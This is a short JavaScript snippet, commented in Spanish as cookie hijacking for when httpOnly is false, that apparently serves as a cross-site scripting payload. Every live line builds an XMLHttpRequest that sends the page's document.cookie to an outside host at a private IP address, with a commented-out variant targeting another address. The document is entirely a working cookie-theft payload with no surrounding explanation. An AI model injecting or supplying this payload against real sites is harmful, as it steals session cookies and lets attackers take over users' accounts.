// secuestro de cookie si tiene el httpOnly en false
//request.open("GET", "http://192.168.1.26:80/?cookie=" + document.cookie, true);
request = new XMLHttpRequest();
request.open("GET", "http://192.168.0.12:80/?cookie=" + document.cookie, true);
request.send();
